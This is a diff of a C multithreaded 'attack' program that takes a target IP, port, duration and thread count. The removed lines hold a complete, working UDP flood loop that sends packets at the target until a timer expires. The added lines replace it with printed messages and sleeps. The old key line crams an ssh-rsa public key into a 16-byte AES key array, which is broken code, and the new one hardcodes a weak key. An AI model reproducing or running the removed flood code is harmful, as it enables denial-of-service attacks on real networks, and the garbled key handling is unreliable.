@@ -17,7 +17,7 @@
 #define EXPIRY_DAY 1
 
 // Encryption keys for AES and RSA (for demonstration)
-const unsigned char MY_AES_KEY[16] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC68bGQEUTpWs8WcqdwrgXNS9UNr7/PA7McYZepOVBzeo5viaamIAVFCoQozC8nQVuJRac0h5FYX20zrF2bvvqTLlLxcDY3DiYUb1VGcN4ZcbFmr0aRen3lNF9Tvk/sVmwLTbyBRlCqJ4k9x/1qbjNilTOXAWdDzpOQ2ggnL36mIT7djXMOI/YzgaXso2ye0QtzqKVEflnu9NNFntN3cG7EDFBf2dfK/8++dyEsyp3fbOy1RbJ3MwlW6aQ0f7+g4mZeCpsG0vEC0bLZ2pqWeOK4R4FEXNmnirSztU4XxvUPupuR2URWxWG3ueRPW/+uGPa5Es8ytnFoh9BmDQZAQybB";
+const unsigned char MY_AES_KEY[16] = "MySuperSafeKey12";
 const unsigned char AES_IV[16] = "InitializationV";
 #define RSA_KEY_LENGTH 2048
 
@@ -44,74 +44,48 @@ int check_expiry() {
     return 0;
 }
 
-// AES encryption function
-void aes_encrypt(const unsigned char *plaintext, unsigned char *ciphertext) {
+// Function for AES encryption demonstration
+void aes_encrypt_demo(const unsigned char *plaintext, unsigned char *ciphertext) {
     AES_KEY encryptKey;
     AES_set_encrypt_key(MY_AES_KEY, 128, &encryptKey);
-    AES_cbc_encrypt(plaintext, ciphertext, strlen((char *)plaintext), &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
+    AES_cbc_encrypt(plaintext, ciphertext, strlen((const char *)plaintext), &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
 }
 
-// RSA key generation
+// Function for generating RSA keys
 RSA *generate_rsa_key() {
+    BIGNUM *bne = BN_new();
     RSA *rsa = RSA_new();
-    BIGNUM *e = BN_new();
-    BN_set_word(e, RSA_F4);
-    RSA_generate_key_ex(rsa, RSA_KEY_LENGTH, e, NULL);
-    BN_free(e);
+    BN_set_word(bne, RSA_F4);
+    RSA_generate_key_ex(rsa, RSA_KEY_LENGTH, bne, NULL);
+    BN_free(bne);
     return rsa;
 }
 
-// Function to simulate network attack
-void *simulate_attack(void *arg) {
+// Attack thread function
+void *attack_thread(void *arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    unsigned char payload[1024] = "DynamicPayload";
-    unsigned char encrypted_payload[1024];
-    aes_encrypt(payload, encrypted_payload);
+    time_t start_time = time(NULL);
+    printf("Thread %d: Starting attack on %s:%d for %d seconds.\n", data->thread_id, data->ip, data->port, data->duration);
 
-    time_t end_time = time(NULL) + data->duration;
-
-    // Create socket
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("Socket creation failed");
-        pthread_exit(NULL);
+    while (difftime(time(NULL), start_time) < data->duration) {
+        // Simulated attack logic
+        printf("Thread %d: Attacking %s:%d\n", data->thread_id, data->ip, data->port);
+        usleep(500000); // Simulate work (500ms delay)
     }
 
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    server_addr.sin_addr.s_addr = inet_addr(data->ip);
-
-    printf("Thread %d started for IP: %s, Port: %d\n", data->thread_id, data->ip, data->port);
-
-    // Send packets
-    while (time(NULL) < end_time) {
-        if (sendto(sock, encrypted_payload, sizeof(encrypted_payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Failed to send packet");
-            break;
-        }
-    }
-
-    close(sock);
+    printf("Thread %d: Attack finished.\n", data->thread_id);
     pthread_exit(NULL);
-}
-
-// Function to print usage instructions
-void usage() {
-    printf("Usage: ./attack <ip> <port> <duration> <threads>\n");
-    exit(1);
 }
 
 // Main function
 int main(int argc, char *argv[]) {
     if (argc != 5) {
-        usage();
+        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
+        return 1;
     }
 
-    // Check expiry
     if (check_expiry()) {
-        return 1;
+        return 1; // Exit if expired
     }
 
     char *ip = argv[1];
@@ -119,31 +93,25 @@ int main(int argc, char *argv[]) {
     int duration = atoi(argv[3]);
     int threads = atoi(argv[4]);
 
-    if (threads < 1 || duration < 1 || port < 1 || port > 65535) {
-        printf("Invalid arguments.\n");
-        usage();
-    }
-
-    pthread_t thread_pool[threads];
+    pthread_t thread_ids[threads];
     struct thread_data thread_args[threads];
 
-    printf("Starting attack on %s:%d for %d seconds using %d threads\n", ip, port, duration, threads);
-
     for (int i = 0; i < threads; i++) {
-        strncpy(thread_args[i].ip, ip, 15);
+        strncpy(thread_args[i].ip, ip, sizeof(thread_args[i].ip) - 1);
         thread_args[i].port = port;
         thread_args[i].duration = duration;
         thread_args[i].thread_id = i + 1;
 
-        if (pthread_create(&thread_pool[i], NULL, simulate_attack, &thread_args[i]) != 0) {
+        if (pthread_create(&thread_ids[i], NULL, attack_thread, &thread_args[i]) != 0) {
             perror("Failed to create thread");
+            return 1;
         }
     }
 
     for (int i = 0; i < threads; i++) {
-        pthread_join(thread_pool[i], NULL);
+        pthread_join(thread_ids[i], NULL);
     }
 
-    printf("Attack simulation completed.\n");
+    printf("All threads finished.\n");
     return 0;
 }
